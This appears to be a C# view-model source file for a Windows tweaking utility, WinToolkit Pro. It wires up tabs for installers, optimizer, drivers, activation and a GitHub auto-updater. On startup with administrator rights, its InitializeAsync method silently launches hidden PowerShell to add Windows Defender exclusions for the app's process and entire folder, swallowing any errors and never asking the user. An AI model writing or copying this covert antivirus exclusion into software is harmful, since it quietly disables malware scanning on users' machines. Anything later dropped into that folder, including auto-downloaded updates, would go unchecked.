using System.Security.Principal;
using CommunityToolkit.Mvvm.ComponentModel;
using CommunityToolkit.Mvvm.Input;
using WinToolkit.Services;
using Wpf.Ui.Appearance;

namespace WinToolkit.ViewModels;

public partial class MainViewModel : ObservableObject
{
    public AppsViewModel AppsVM { get; }
    public AppUpdaterViewModel AppUpdaterVM { get; }
    public OptimizerViewModel OptimizerVM { get; }
    public DriversViewModel DriversVM { get; }
    public WindowsUpdateViewModel WindowsUpdateVM { get; }
    public CleanerViewModel CleanerVM { get; }
    public SystemToolsViewModel SystemToolsVM { get; }
    public ActivationViewModel ActivationVM { get; }
    public GitHubUpdateService GitHubUpdater { get; }
    public ActivityService Activity => ActivityService.Instance;
    public OsEnvironmentService OsEnv => OsEnvironmentService.Instance;

    [ObservableProperty]
    private int _selectedNavigationIndex = 0;

    [ObservableProperty]
    private string _systemInfo = string.Empty;

    [ObservableProperty]
    private bool _isAdministrator;

    public bool CanElevate => !IsAdministrator;

    [ObservableProperty]
    private bool _isDarkTheme = true;

    // Automatic GitHub Update Properties
    [ObservableProperty]
    [NotifyPropertyChangedFor(nameof(CanApplyUpdate))]
    private bool _isUpdateAvailable;

    [ObservableProperty]
    [NotifyPropertyChangedFor(nameof(CanApplyUpdate))]
    private bool _isUpdatingApp;

    public bool CanApplyUpdate => !IsUpdatingApp && IsUpdateAvailable;

    [ObservableProperty]
    private double _updateDownloadProgress;

    [ObservableProperty]
    private string _updateStatusText = string.Empty;

    [ObservableProperty]
    private string _latestVersionTag = string.Empty;

    [ObservableProperty]
    private string _appVersionDisplay = $"v{GitHubUpdateService.GetCurrentVersion()} • {OsEnvironmentService.Instance.ArchitectureBadge}";

    private GitHubUpdateService.ReleaseUpdateInfo? _pendingRelease;

    public MainViewModel(
        AppsViewModel appsVM,
        AppUpdaterViewModel appUpdaterVM,
        OptimizerViewModel optimizerVM,
        DriversViewModel driversVM,
        WindowsUpdateViewModel windowsUpdateVM,
        CleanerViewModel cleanerVM,
        SystemToolsViewModel systemToolsVM,
        ActivationViewModel activationVM,
        GitHubUpdateService gitHubUpdater)
    {
        AppsVM = appsVM;
        AppUpdaterVM = appUpdaterVM;
        OptimizerVM = optimizerVM;
        DriversVM = driversVM;
        WindowsUpdateVM = windowsUpdateVM;
        CleanerVM = cleanerVM;
        SystemToolsVM = systemToolsVM;
        ActivationVM = activationVM;
        GitHubUpdater = gitHubUpdater;

        CheckPrivilegesAndSystem();
    }

    private int _isCheckingUpdates = 0;

    public async Task InitializeAsync()
    {
        // 1. Immediately launch update check concurrently in background (finishes in <1s)
        _ = CheckForAppUpdatesAsync();

        // 2. Prioritize active tab (Software Installer) and OS Optimizer initialization
        var appsInit = AppsVM.InitializeAsync();
        var optInit = OptimizerVM.InitializeAsync();

        // 3. Initialize background hardware specs concurrently without blocking UI
        _ = Task.Run(async () =>
        {
            try { await DriversVM.InitializeAsync(); } catch { }
        });

        await Task.WhenAll(appsInit, optInit);

        // Auto-register Defender exclusion for WinToolkitPro to prevent 10-second cloud scan delay
        if (IsAdministrator)
        {
            _ = Task.Run(() =>
            {
                try
                {
                    var exePath = Environment.ProcessPath ?? string.Empty;
                    var exeName = System.IO.Path.GetFileName(exePath);
                    var appDir = System.IO.Path.GetDirectoryName(exePath) ?? string.Empty;
                    if (!string.IsNullOrEmpty(exeName))
                    {
                        var psi = new System.Diagnostics.ProcessStartInfo
                        {
                            FileName = "powershell.exe",
                            Arguments = $"-NoProfile -WindowStyle Hidden -Command \"try {{ Add-MpPreference -ExclusionProcess '{exeName}' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '{appDir}' -ErrorAction SilentlyContinue }} catch {{}}\"",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        };
                        using var p = System.Diagnostics.Process.Start(psi);
                        p?.WaitForExit(4000);
                    }
                }
                catch { }
            });
        }
    }

    [RelayCommand]
    public async Task CheckForAppUpdatesAsync()
    {
        if (Interlocked.Exchange(ref _isCheckingUpdates, 1) == 1) return;
        try
        {
            var update = await GitHubUpdater.CheckForUpdatesAsync();
            System.Windows.Application.Current?.Dispatcher?.Invoke(() =>
            {
                if (update.UpdateAvailable && !string.IsNullOrEmpty(update.DownloadUrl))
                {
                    _pendingRelease = update;
                    LatestVersionTag = $"v{update.LatestVersion}";
                    UpdateStatusText = $"New WinToolkit Pro update ({LatestVersionTag}) available!";
                    IsUpdateAvailable = true;
                }
                else
                {
                    IsUpdateAvailable = false;
                }
            });
        }
        catch { }
        finally
        {
            Interlocked.Exchange(ref _isCheckingUpdates, 0);
        }
    }

    [RelayCommand]
    public async Task ApplyAppUpdateAsync()
    {
        if (_pendingRelease == null || IsUpdatingApp) return;

        IsUpdatingApp = true;
        UpdateStatusText = "Downloading update package...";

        var progress = new Progress<double>(p =>
        {
            System.Windows.Application.Current?.Dispatcher?.Invoke(() =>
            {
                UpdateDownloadProgress = p;
                UpdateStatusText = $"Downloading update ({p:F0}%)...";
            });
        });

        try
        {
            await GitHubUpdater.DownloadAndApplyUpdateAsync(
                _pendingRelease,
                progress: progress,
                statusCallback: s =>
                {
                    System.Windows.Application.Current?.Dispatcher?.Invoke(() =>
                    {
                        UpdateStatusText = s;
                    });
                }
            );
        }
        catch (Exception ex)
        {
            System.Windows.Application.Current?.Dispatcher?.Invoke(() =>
            {
                IsUpdatingApp = false;
                UpdateStatusText = $"Update failed: {ex.Message}";
            });
        }
    }

    private void CheckPrivilegesAndSystem()
    {
        using var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        IsAdministrator = principal.IsInRole(WindowsBuiltInRole.Administrator);

        var osEnv = OsEnvironmentService.Instance;
        var machine = Environment.MachineName;

        SystemInfo = $"{machine} | {osEnv.OsDisplayName} | Admin: {(IsAdministrator ? "Yes" : "No")}";
    }

    [RelayCommand]
    private void ToggleTheme()
    {
        IsDarkTheme = !IsDarkTheme;
        ApplicationThemeManager.Apply(IsDarkTheme ? ApplicationTheme.Dark : ApplicationTheme.Light);
    }

    [RelayCommand]
    private void RestartAsAdmin()
    {
        try
        {
            var exeName = Environment.ProcessPath;
            if (string.IsNullOrEmpty(exeName)) return;

            var startInfo = new System.Diagnostics.ProcessStartInfo
            {
                FileName = exeName,
                UseShellExecute = true,
                Verb = "runas"
            };
            System.Diagnostics.Process.Start(startInfo);
            System.Windows.Application.Current.Shutdown();
        }
        catch { }
    }
}
